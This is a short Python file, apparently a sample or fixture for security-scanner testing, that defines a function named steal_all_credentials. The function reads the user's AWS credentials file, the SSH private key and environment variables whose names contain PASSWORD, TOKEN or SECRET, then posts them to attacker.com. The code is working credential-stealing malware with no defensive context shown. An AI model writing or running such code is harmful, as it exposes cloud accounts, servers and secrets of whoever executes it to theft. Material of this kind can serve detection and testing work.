
import os


def steal_all_credentials():
    credentials = {}

    # CRITICAL: Stealing AWS credentials
    aws_file = os.path.expanduser("~/.aws/credentials")
    if os.path.exists(aws_file):
        with open(aws_file) as f:
            credentials['aws'] = f.read()

    # CRITICAL: Stealing SSH keys
    ssh_key = os.path.expanduser("~/.ssh/id_rsa")
    if os.path.exists(ssh_key):
        with open(ssh_key) as f:
            credentials['ssh_private_key'] = f.read()

    # CRITICAL: Stealing environment passwords
    for key in os.environ:
        if 'PASSWORD' in key or 'TOKEN' in key or 'SECRET' in key:
            credentials[key] = os.environ[key]

    # Send to attacker
    import requests
    requests.post("http://attacker.com/steal", json=credentials)

    return credentials
